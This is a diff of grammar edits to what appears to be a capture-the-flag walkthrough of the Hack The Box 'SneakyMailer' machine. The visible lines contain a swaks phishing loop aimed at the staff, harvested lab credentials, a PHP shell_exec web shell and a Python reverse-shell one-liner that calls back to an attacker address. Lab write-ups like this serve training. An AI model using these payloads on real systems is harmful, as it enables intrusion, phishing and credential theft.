@@ -32,7 +32,7 @@ After going to the website (http://sneakycorp.htb) I found the names, and email 
 
 ![team_webpage.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/a43946231f9b47ceb2b907dab108c9c8.png)
 
-Created a wordlist of all the emails with common command lines tools. This task could also have been done with [cewl](https://tools.kali.org/password-attacks/cewl)
+I Created a wordlist of all the emails with common command lines tools. This task could also have been done with [cewl](https://tools.kali.org/password-attacks/cewl)
 
 
 ```bash
@@ -40,7 +40,7 @@ curl http://sneakycorp.htb/team.php -o sneakymailer_page.txt
 cat sneakymailer_page.txt | grep -i "sneakymailer.htb</td>" | cut -d'>' -f2 | sed -e 's/<\/td//' > employee_email_list.txt
 ```
 
-From there I spent a lot of time enumerating the website and other running services for information. Didn't find anything which could lead to a remote code execution so I tried to interact with the users. I send mail to all users with an embedded link, and pray for someone clicks on it.
+From there I spent a lot of time enumerating the website and other running services for information. Didn't find anything which could lead to a remote code execution so I tried to interact with the users. I sent a mail to all users with an embedded link, and pray for someone clicks on it.
 
 ```bash
 cat mail_list.txt | while read mail;do swaks --server 10.10.10.197 --to $mail --from evil@sneakymailer.htb --header "Error with your login" --body "Hello, please check this website http://10.10.14.9:8000";done
@@ -48,7 +48,7 @@ cat mail_list.txt | while read mail;do swaks --server 10.10.10.197 --to $mail --
 
 ![mail_response.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8b58fa1e11f74b4fb3cb8aa92d3c71d5.png)
 
-The data from the response of the user was urlencode but they can be easily decode with online tools. I past the parameters in a burp suite panel and get the credentials with `CRTL+SHIFT+U` shortcuts.
+The data from the response of the user was urlencode but it can be easily decode with online tools. I past the parameters in a burp suite panel and get the credentials with the `CRTL+SHIFT+U` shortcut.
 
 ```plaintext
 firstName=Paul
@@ -58,14 +58,13 @@ password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 ```
 
-I used evolution email client to connect to the mail server as Paul. He has sent 2 mail, the first one asked the user low to install and test packages through pypi and exposed users credentials.
-
+To connect to the database and see the emails of the user I used evolution wich is a email client. Paul has sent 2 mails. The first one asked `low` user to intall and test pakages through pypi and the second exposed `developer` user credentials.
 
 
 ![password_reset_mail.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/9bb834cf2b324cce84e14d77378c9161.png)
 
 
-I failed to SSH with developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C credentials but successfully logged into FTP. Developer has access to `dev` directory and could upload php files. I modified my hosts file again and add the subdomain `dev.sneeakycorp`.
+I failed to SSH with `developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` credentials but successfully logged into FTP. Developer has access to `dev` directory and could upload php files. I modified my hosts file again and add the subdomain `dev.sneeakycorp`.
 
 
 
@@ -76,7 +75,7 @@ Created PHP script which took one parameter and executed as a command line.
 # Content of 'shell.php'
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 ```
-Uploaded the file with FTP, open a port for incoming connection and get a shell with the exploit below. Replace the Xs by your ip address.
+Uploaded `shell.php` with FTP, open a port for incoming connection and get a shell with the exploit below. Replace the Xs by your ip address.
 
 ```plaintext
 http://dev.sneakycorp.htb/shell.php?cmd=/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("X.X.X.X",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -87,13 +86,13 @@ http://dev.sneakycorp.htb/shell.php?cmd=/usr/bin/python -c 'import socket,subpro
 ![foothold_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/3547417d933749f0ad9fef5ed7b674e5.png)
 
 
-Now that I was www-data user, I started to enumerate the machine and got the subdomain `pypi.sneakycorp.htb`. I modified  my hosts file again and got to the site but didn't get anything because I was redirected to sneakycorp.htb. I remembered from the beginning of the enumeration that the server had 2 webservers running. The second one running on port 8080.
+Now that I was `www-data` user, I started to enumerate the machine and got the subdomain `pypi.sneakycorp.htb`. I modified  my hosts file again to access the new subdomain but didn't get anything because I was redirected to sneakycorp.htb. I remembered from the beginning of the enumeration that the server had 2 webservers running. The second one running on port 8080.
 
 
 ![pypi_subdomaine.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/4904889adcc4483d8ebc5890b739f80d.png)
 
 
-From there I knew how to get access to higher privileged accounts. I knew from previous enumerations that pypi was the user who runs pypiserver and low user was running the python installation module .
+From there I knew how to get access to higher privileged accounts. I knew from previous enumerations that `pypi` was the user who runs pypiserver and `low` user was running the python installation module .
 
 
 ![ps_result.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/2c1acf17a2a74add9cc75bc33fbffab4.png)
@@ -183,7 +182,7 @@ sudo pip3 install $TF
 ![root_sell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/fd94916a739340d0b5ae14c6d316714f.png)
 
 
-This is how is rooted SneakyMailer machine. I got stuck multiple time on this machine but learn stuff on the way. Thanks for reading this walkthrough.
+This is how I rooted SneakyMailer machine. I got stuck multiple time on this machine but learn stuff on the way. Thanks for reading this walkthrough.
 
 # References 
 - [https://diveintopython3.problemsolving.io/files.html](https://diveintopython3.problemsolving.io/files.html)
